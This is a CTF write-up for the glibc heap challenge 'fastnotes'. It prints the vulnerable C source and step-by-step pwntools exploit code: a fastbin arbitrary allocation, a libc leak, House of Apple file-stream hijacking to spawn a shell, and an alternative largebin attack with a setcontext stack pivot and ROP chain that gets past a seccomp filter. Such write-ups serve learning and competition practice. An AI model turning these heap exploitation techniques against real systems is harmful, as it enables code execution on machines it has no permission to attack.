---
id: 2
title: "BlahajCTF 2025"
subtitle: "Writeup for the pwn challenge fastnotes by FS in BlahajCTF 2025"
date: "2025.12.9"
tags: "writeups"
---

Last weekend, I participated in BlahajCTF 2025 with a few friends from secondary school. Among the many pwn challenges given, I solved all but two. "fastnotes", by FS, is one of the challenges I solved (and blooded!), though the solve is far from what was intended by the challenge author.

## Challenge Protections  

```
[*] '/home/nikolawinata/Documents/ctf/blahaj/2025/fastnotes/fastnotes'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

All protections are enabled.

## Challenge  

```c
// gcc -o fastnotes fastnotes.c -fstack-protector -fPIE -pie -z relro -z now
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <sys/prctl.h>
#include <asm/unistd.h>
#include <stddef.h>
#include <stdbool.h>

void menu();
void createNote();
void viewNote();
void editNote();
void deleteNote();
void createSpecialNote();
void leave();
void correctInput(char *note, ssize_t len);
void somethingSpecial();

#define MAX_NOTES 8
#define SZ_SPECIAL_NOTES 0x500
int isCalled = 0;

char *chunk_ptrs[0x10] = {0};
int size_ptrs[0x10] = {0};
char *special_chunk_ptrs[2] = {0};
void **ptr_to_fp_chunk = NULL;
int idx = -1;
FILE *fp = NULL;
void setup()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
}

int main()
{
    setup();
    char greeting[] = "Welcome to the FAST notes taking app\n";
    write(1, greeting, strlen(greeting));
    somethingSpecial();
    menu();
}

void menu()
{
    int opt = 0;
    char menuScreen[] = "Choose what you want to do\n1: Create a note\n2: Edit a note\n3: View a note\n4: Delete a note\n5: Create Special Notes\n";
    while (true)
    {
        write(1, menuScreen, strlen(menuScreen));
        scanf("%d", &opt);
        switch (opt)
        {
        case 1:
            createNote();
            break;
        case 2:
            editNote();
            break;
        case 3:
            viewNote();
            break;
        case 4:
            deleteNote();
            break;
        case 5:
            createSpecialNote();
            break;
        default:
            leave();
        }
    }
}

void cleanUp()
{
    char msg[] = "byebye";
    fwrite(msg, sizeof(char), 6, ptr_to_fp_chunk[0]);
    _exit(0);
}

void leave()
{
    uint idx = 0;
    write(1, "Hm...are you sure? Why not you edit 1 more note?\n", 50);
    for (int i = 0; i < 1; i++)
    {
        scanf("%d", &idx);
        int c;
        while ((c = getchar()) != '\n' && c != EOF)
            ;
        if (idx < MAX_NOTES)
        {
            /**the following lines were added to preserve my sanity */
            ssize_t len = read(0, ((char *)chunk_ptrs[idx] - 0x10), *(size_t *)((char *)chunk_ptrs[idx] - sizeof(size_t)));
            correctInput(chunk_ptrs[idx], len);
        }
    }
    cleanUp();
}

void correctInput(char *note, ssize_t len)
{
    if (len > 0 && note[len - 1] == '\n')
    {
        note[len - 1] = '\0';
    }
    else
    {
        note[len] = '\0';
    }
}

void createNote()
{
    if (idx >= MAX_NOTES || isCalled)
    {
        write(1, "NO MORE!\n", 9);
        return;
    }
    uint size = 0;
    scanf("%d", &size);
    if (size != 0 && size <= 0x80)
    {
        char *note = calloc(size, sizeof(char));
        ssize_t len = read(0, note, size - 1);
        correctInput(note, len);
        if (!strstr(note, "FAST:") || size > 0x60)
        {
            write(1, "Disgusting\n", 11);
            free(note);
        }
        else
        {
            idx++;
            chunk_ptrs[idx] = note;
            size_ptrs[idx] = size;
        }
    }
    return;
}

void editNote()
{
    uint idx = 0;
    scanf("%d", &idx);
    if (idx <= 0x10 && chunk_ptrs[idx] != 0)
    {
        ssize_t len = read(0, chunk_ptrs[idx], size_ptrs[idx] - 1);
        correctInput(chunk_ptrs[idx], size_ptrs[idx]);
    }
    return;
}

void viewNote()
{
    uint idx = 0;
    scanf("%d", &idx);
    if (idx <= 0x10 && chunk_ptrs[idx] != 0)
    {
        char *note = chunk_ptrs[idx];
        size_t len = 0;
        while (note[len] != '\0')
        {
            len++;
        }
        write(1, note, len);
    }
}

void deleteNote()
{
    uint idx = 0;
    scanf("%d", &idx);
    if (chunk_ptrs[idx] != 0)
    {
        free(chunk_ptrs[idx]);
    }
    return;
}

void somethingSpecial()
{
    fp = fopen("/tmp/specialNotes.txt", "w+"); // not the flag in case you where wondering
    ptr_to_fp_chunk = malloc(0x10);
    *ptr_to_fp_chunk = (char *)fp;
    fp = NULL;
}

void createSpecialNote()
{
    if (isCalled >= 2)
    {
        return;
    } // you can't run this function > 2 times
    int c;
    while ((c = getchar()) != '\n' && c != EOF)
        ;
    char *specialNote = malloc(SZ_SPECIAL_NOTES);
    ssize_t len = read(0, specialNote, SZ_SPECIAL_NOTES - 1);
    correctInput(specialNote, len);
    special_chunk_ptrs[++idx] = specialNote;
    isCalled++;
    return;
}
```

This is a typical heap CRUD challenge with a UAF, except there are a few extra things:

1. Allocations are handled with `calloc()` - this means that allocations do not pull from the tcache
2. Allocations-to-be-saved are restricted to sizes less than or equal to 0x60 and must have 'FAST:' written into them
3. If they do not fulfil the above criteria, they are allocated, and then freed without saving.
4. You can allocate chunks of 0x500 with `malloc()` only twice, and they are saved into another allocation array. After allocating one of these chunks, you are not allowed to allocate further chunks with `calloc()`
5. There is a file struct allocated onto the heap, with another chunk containing a pointer to this file struct. When the program exits, `fwrite()` is called on this file struct through the pointer on the heap.
6. We only have 8 allocations, hence we cannot perform just an ordinary `fd` hijack to gain arbitrary allocations

Since the program exits with `_exit()` and `fwrite()` is called on the file struct pointer, the only way we can achieve remote code execution (RCE) is to hijack the file struct (or its pointer) and perform a File Stream Oriented Programming (FSOP) attack.

## Solve Process

At first, I was convinced that the attack strategy had something to do with fastbin consolidate 💀. My ahh was trying to find a way to corrupt the size header of the chunk with the file struct pointer so we could consolidate into the chunk with one of the 0x500 allocations, hijack the pointer and subsequently overlap the file struct (and its `wide_data`). 

However, I kept running into `malloc_consolidate` errors about "unaligned fastbin chunks" (I realised later on this could be resolved with a bit of fastbin fengshui but at this point I was desperate for time 💀).

Eventually, my attack path resolved into the following:

1. Find a way to corrupt the size header of an earlier-allocated chunk so we could forge a size, when freed, would fit into the unsorted bin, and give us a LIBC leak
2. Hijack the chunk containing the file struct pointer to point to our forged file struct chunk as it so happens the chunk's size falls within the fastbin range!
3. Use the 0x500 allocations to write our file structs and `wide_data` fields.

The only problem is figuring out how to gain enough allocations such that the heap is long enough (and aligned! chunks MUST end at another chunk's size header) while keeping within the allocation limit of 8 times. 

In `createNote()`:

```c
void createNote()
{
    if (idx >= MAX_NOTES || isCalled)
    {
        write(1, "NO MORE!\n", 9);
        return;
    }
    uint size = 0;
    scanf("%d", &size);
    if (size != 0 && size <= 0x80)
    {
        char *note = calloc(size, sizeof(char));
        ssize_t len = read(0, note, size - 1);
        correctInput(note, len);
        if (!strstr(note, "FAST:") || size > 0x60)
        {
            write(1, "Disgusting\n", 11);
            free(note);
        }
        else
        {
            idx++;
            chunk_ptrs[idx] = note;
            size_ptrs[idx] = size;
        }
    }
    return;
}
``` 

There is an initial check for the size to be within 0x80. If this is true, an allocation is made, and content is read into the chunk. Afterwards, there is a further check to see if the contents written start with "FAST:" AND if the size is greater than 0x60. If not, the chunk is freed and not saved.

However, this still means that even if our chunk is deemed "invalid", it is still allocated and thus __expands the heap__. This further comes in useful as `calloc()` will not draw from the tcache for our first seven "invalid" chunks, hence we can use this to get around the allocation limit and ensure the heap is large enough for our forged unsorted chunk:

```python
create(0x60, b'FAST:')
create(0x60, b'FAST:')
create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x60, b'meh:') # To fill up the tcache for our arballoc chunk as well
create(0x60, b'FAST:')
```

We prepare two valid chunks at the start: one to accomodate our fastbin arballoc, and the other to be our forged unsorted chunk. Now, we can proceed to obtain the safelinking mangle (while getting heap base) and prepare for our arbitrary allocation to forge the chunk header:

```python
free(0)
mangle = u64(view(0,5).ljust(8, b'\0'))
log.info("mangle, %#x", mangle)
heap_base = mangle << 12
```

### Fastbin Allocations: Not Quite Tcache

The fastbin is a heap mechanism that, not unlike the tcache, uses a singly linked list to keep track of free chunks. When the tcache of a certain bin is filled up to 7 chunks, further free chunks go into the fastbin.

However, while tcache poisoning grants a __very__ (very) flexible mode of arbitrary allocations, the fastbin is quite so ore restrictive. This is because fastbin allocations __check if the size header of the target chunk is the same as the corresponding fastbin__. Hence, in order to arballoc to the chunk header of our victim chunk __and overwrite it__, we will need to forge a corresponding size header in the preceding chunk:

```python
edit(0, p64(mangle ^ (heap_base+0x4c0))) # Since the first chunk is the one we freed first anyway, let's just reuse this for our arballoc 

create(0x60, b'FAST:'.ljust(0x20, b'A')+p64(0)+p64(0x71)+p64(mangle)) # Write the fake size header for the arbitrary alloc
create(0x60, b'FAST:'.ljust(0x30, b'A')+p64(0)+p64(0x771)) # Forge size header on the victim chunk
```

![Prepare for arballoc](/images/2025-12-09-19-47-01.png)
![Forge chunk header for arballoc](/images/2025-12-09-19-48-11.png)
![Overwrite victim size header](/images/2025-12-09-19-49-14.png)

Now we can get our LIBC leak and thus the base address:

```python
libc.address = u64(view(1, 6).ljust(8, b'\0')) - 0x203b20
log.info("libc.address, %#x", libc.address)
```

With our LIBC base, we can proceed to hijack the file struct pointer and forge our own file struct. We fill up the tcache for another bin:

```python
for i in range(8):
    create(0x10, b'meh:')
```

Now we can do another arballoc to allocate to the file struct pointer chunk and overwrite it with the soon-to-be location of our forged file structure:

```python
create(0x10, b'FAST:')
free(5)
edit(5, p64(mangle ^ (heap_base+0x470)))
create(0x10, b'FAST:')
create(0x10, b'FAST:')
edit(7, p64(heap_base+0x5f0))
```

## malloc_consolidate: unaligned fastbin chunk detected

Yippee! That should be all right? We can now allocate our two special chunks for our file struct and `wide_data`:

```python
stderr_addr = heap_base + 0x610
wide_data = heap_base + 0xcf0

fs = FileStructure()
fs.flags = u64("  " + "sh".ljust(6, "\x00"))
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = stderr_addr+0x1000 # Should be null
fs.chain = libc.sym.system
fs._codecvt = stderr_addr
# stderr becomes it's own wide data vtable
# Offset is so that system (fs.chain) is called
fs._wide_data = wide_data
fs.vtable = libc.sym._IO_wfile_jumps - 0x38 + 0x18

create_sp(bytes(fs))
create_sp(flat({
    0x48+0x68:libc.sym.system,
    0xe0:wide_data+0x48
}, filler=b'\0'))
```

However, if we try this, we run into an error:
![the error](/images/2025-12-09-20-00-26.png)

How can this even be? We don't even have any fastbin chunks in the fastbin left!
![fastbin](/images/2025-12-09-20-01-06.png)

It turns out that when chunks in the unsorted range are allocated, GLIBC does a check:

```c
   #define misaligned_chunk(p) \
  ((uintptr_t)(MALLOC_ALIGNMENT == CHUNK_HDR_SZ ? (p) : chunk2mem (p)) \
   & MALLOC_ALIGN_MASK) // Checks if p is 16-bit aligned: the last digit is 0
   ... 
    if (p != 0) {
      do {
	{
	  if (__glibc_unlikely (misaligned_chunk (p)))
	    malloc_printerr ("malloc_consolidate(): "
			     "unaligned fastbin chunk detected");

	  unsigned int idx = fastbin_index (chunksize (p));
	  if ((&fastbin (av, idx)) != fb)
	    malloc_printerr ("malloc_consolidate(): invalid chunk size");
	}
```

When `malloc_consolidate()` is called, GLIBC checks if every chunk in `malloc_state` is 16-bit aligned i.e. the last digit is zero.
We can break at `malloc_consolidate()` to see the state of `malloc_state` when we try to allocate our special chunk:

![malloc state](/images/2025-12-09-20-04-22.png)

Indeed, we can see that there is a corrupted address in one of the fastbins! This is because of the residual corruption left by us when we try to arballoc.

After we claim our target chunk, the following happens in the fastbin freelist:

```c
// head -> c0 -> target -> value ^ (target >> 12)
// head -> value ^ (target >> 12) <-- THIS IS CORRUPTED
```

To resolve this, before we allocate our special chunks, we can instead free a valid chunk into the corresponding fastbin and terminate the fastbin there so `malloc_consolidate` thinks all the fastbins are valid:

```python
create(0x10, b'FAST:')
free(5)
edit(5, p64(mangle ^ (heap_base+0x470)))
create(0x10, b'FAST:')
create(0x10, b'FAST:')
edit(7, p64(heap_base+0x5f0))
free(6)
edit(6, p64(mangle)) # To trick the fastbin into thinking there are no other chunks
```

Now, we are able to allocate our special chunks without an error!

## RCE

When `fwrite()` is called on a file struct, the `_IO_XSPUTN` offset of the vtable is called:

```c
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
size_t
_IO_fwrite (const void *buf, size_t size, size_t count, FILE *fp)
{
  size_t request = size * count;
  size_t written = 0;
  CHECK_FILE (fp, 0);
  if (request == 0)
    return 0;
  _IO_acquire_lock (fp);
  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)
    written = _IO_sputn (fp, (const char *) buf, request);
  _IO_release_lock (fp);
  /* We have written all of the input in case the return value indicates
     this or EOF is returned.  The latter is a special case where we
     simply did not manage to flush the buffer.  But the data is in the
     buffer and therefore written as far as fwrite is concerned.  */
  if (written == request || written == EOF)
    return count;
  else
    return written / size;
}
```

We can perform a House of Apple by adjusting the offset from `_IO_wfile_jumps` such that `_IO_wfile_overflow` is called:

```python
stderr_addr = heap_base + 0x610
wide_data = heap_base + 0xcf0

fs = FileStructure()
fs.flags = u64("  " + "sh".ljust(6, "\x00"))
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = stderr_addr+0x1000 # Should be null
fs.chain = libc.sym.system
fs._codecvt = stderr_addr
# stderr becomes it's own wide data vtable
# Offset is so that system (fs.chain) is called
fs._wide_data = wide_data
fs.vtable = libc.sym._IO_wfile_jumps - 0x38 + 0x18

create_sp(bytes(fs))
create_sp(flat({
    0x48+0x68:libc.sym.system,
    0xe0:wide_data+0x48
}, filler=b'\0'))

leave(0, b'bleh')

p.interactive()
```

This gives us a shell!
![shell](/images/2025-12-09-20-25-58.png)

## Intended Solution (+seccomp)

After the CTF, the author told me that the intended solution was not to hijack the file struct pointer chunk through a fastbin arbitrary allocation (he had made the mistake of making the file struct pointer chunk within the fastbin size range), but rather an arbitrary write with a largebin attack.

Furthermore, the original challenge involved bypassing a seccomp filter that prevented a trivial shell through execve/execveat:

```c
int install_filter_via_prctl(void)
{
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execveat, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };

    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0))
    {
        perror("prctl(NO_NEW_PRIVS)");
        return -1;
    }

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) == -1)
    {
        perror("prctl(SECCOMP)");
        return -1;
    }
    return 0;
}
```

In order to do this, we create two fake unsorted chunks. We prepare a heap layout with such:

```python
# overflower + victim

create(0x60, b'FAST:') # 0 
create(0x60, b'FAST:') # 1

# buffer chunks

create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x80, b'FAST:')
create(0x70, b'FAST:')

# overflower + victim

create(0x60, b'FAST:') # 2
create(0x60, b'FAST:') # 3

# Buffer chunks

create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x60, b'meh:')
create(0x50, b'meh:')
create(0x50, b'meh:')
create(0x50, b'meh:')
create(0x20, b'meh:')
create(0x50, b'meh:')

# Arballoc

create(0x60, b'FAST:') # 4
```

Now, we arballoc twice to forge size headers:

```python
edit(0, p64(mangle ^ (heap_base+0x4c0)))
create(0x60, b'FAST:'.ljust(0x20, b'A')+p64(0)+p64(0x71)+p64(mangle))
create(0x60, b'FAST:'.ljust(0x30, b'A')+p64(0)+p64(0x4e1))
free(1) # first fake unsorted chunk

libc.address = u64(view(1, 6).ljust(8, b'\0')) - 0x203b20
log.info("libc.address, %#x", libc.address)

edit(2, b'A'*0x20+p64(0)+p64(0x71)+p64(mangle))
free(4)
edit(4, p64(mangle ^ (heap_base + 0xa10)))
create(0x60, b'FAST:')
create(0x60, b'FAST:'.ljust(0x30, b'A')+p64(0)+p64(0x4d1)) # second fake unsorted chunk, must be smaller than the first
```

This puts us in position to perform a largebin attack to overwrite the file struct pointer with a pointer to our second fake chunk.

We use the special chunk allocations to insert the fake chunks into the largebin. Since the special note allocations of 0x500 are larger than the unsorted bin chunks of 0x4e0 and 0x4d0, glibc:
    - Sorts the unsorted chunks into the large/smallbin 
    - Allocates a fresh chunk for the special notes chunk from the top chunk

First we insert the first fake chunk into the largebin:

```python
create_sp(b'a')
```

Then, using the UAF on our fake chunk, we can edit `bk_nextsize` to the `target-0x20`:

```python
edit(1, p64(libc.sym.main_arena+1152)*2+p64(heap_base+0x500)+p64(heap_base+0x480-0x20))
```

Finally, we free our second fake chunk into the unsorted bin and use our second special chunk allocation to insert it into the same largebin as the first largebin chunk:

```python
free(3)
create_sp(b'a')
```

This writes the address of the second fake chunk to our file struct pointer chunk.

### RCE: Stack Pivoting to ROP

Now, we can use the `leave()` feature to edit the second fake chunk to FSOP and RCE. However, because seccomp prevents us from using `execve` and `execveat` syscalls, a trivial shell with `system()` will not work. We will have to find a way to pivot our stack onto the heap where our ROP chain can be written and executed. 

We use House of Apple yet again, but instead employ two gadgets:

```
0x00000000001303d5 : mov rdx, rax ; call qword ptr [rbx + 0x28]
```

to set the value of `rdx` and call our second gadget:

an `rsp` modifiying gadget at `setcontext+61`:

```
   0x00007ffff7c4a99d <+61>:	mov    rsp,QWORD PTR [rdx+0xa0]
   0x00007ffff7c4a9a4 <+68>:	mov    rbx,QWORD PTR [rdx+0x80]
   0x00007ffff7c4a9ab <+75>:	mov    rbp,QWORD PTR [rdx+0x78]
   0x00007ffff7c4a9af <+79>:	mov    r12,QWORD PTR [rdx+0x48]
   0x00007ffff7c4a9b3 <+83>:	mov    r13,QWORD PTR [rdx+0x50]
   0x00007ffff7c4a9b7 <+87>:	mov    r14,QWORD PTR [rdx+0x58]
   0x00007ffff7c4a9bb <+91>:	mov    r15,QWORD PTR [rdx+0x60]
   0x00007ffff7c4a9bf <+95>:	test   DWORD PTR fs:0x48,0x2
   0x00007ffff7c4a9cb <+107>:	je     0x7ffff7c4aa86 <setcontext+294>
   ...
   0x00007ffff7c4aa86 <+294>:	mov    rcx,QWORD PTR [rdx+0xa8]
   0x00007ffff7c4aa8d <+301>:	push   rcx
   0x00007ffff7c4aa8e <+302>:	mov    rsi,QWORD PTR [rdx+0x70]
   0x00007ffff7c4aa92 <+306>:	mov    rdi,QWORD PTR [rdx+0x68]
   0x00007ffff7c4aa96 <+310>:	mov    rcx,QWORD PTR [rdx+0x98]
   0x00007ffff7c4aa9d <+317>:	mov    r8,QWORD PTR [rdx+0x28]
   0x00007ffff7c4aaa1 <+321>:	mov    r9,QWORD PTR [rdx+0x30]
   0x00007ffff7c4aaa5 <+325>:	mov    rdx,QWORD PTR [rdx+0x88]
   0x00007ffff7c4aaac <+332>:	xor    eax,eax
   0x00007ffff7c4aaae <+334>:	ret 
```

As the details of how to ROP from an FSOP attack is outside of the scope of this write-up [and can be found here](https://blog.kylebot.net/2022/10/22/angry-FSROP/), we modify our file struct to pivot onto our ROP chain on the same allocation:

```python
rop = ROP(libc)
rop.raw(libc.address+0x00000000000b503c) # pop rdx + pop 4 regs
rop.raw(constants.O_RDONLY)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.call(libc.sym.syscall, [constants.SYS_open, chain+0x48])
rop.raw(libc.address+0x00000000000b503c)
rop.raw(0x100)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.rdi = 4
rop.rsi = heap_base+0x280
rop.raw(libc.sym.read)
rop.raw(libc.address+0x00000000000b503c)
rop.raw(0x100)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.rdi = 1
rop.rsi = heap_base+0x280
rop.raw(libc.sym.write)

fs = FileStructure()
fs.flags = u64("  " + "sh".ljust(6, "\x00"))
fs._IO_write_base = 0
fs._IO_write_ptr = libc.sym.setcontext+61
fs._lock = stderr_addr+0x1000 # Should be null
fs._codecvt = stderr_addr
# stderr becomes it's own wide data vtable
# Offset is so that system (fs.chain) is called
fs._wide_data = wide_data
fs.vtable = libc.sym._IO_wfile_jumps - 0x38 + 0x18

wide_data_str = flat({
    0x68: libc.address + 0x00000000001303d5,
    0xe0: wide_data,
    0xa0: [chain+0x18+0x50-8,rop.build()[0]]
}, filler=b'\0')
```

and write everything to our fake file struct chunk with `leave()` to trigger the ROP chain:

```python
leave(3, bytes(fs)+wide_data_str+b'flag.txt'+p64(0)+rop.chain())
```

The ROP chain does a standard open-read-write chain on flag.txt to eventually write it out to the console:

![intended](/images/2025-12-10-13-12-42.png)
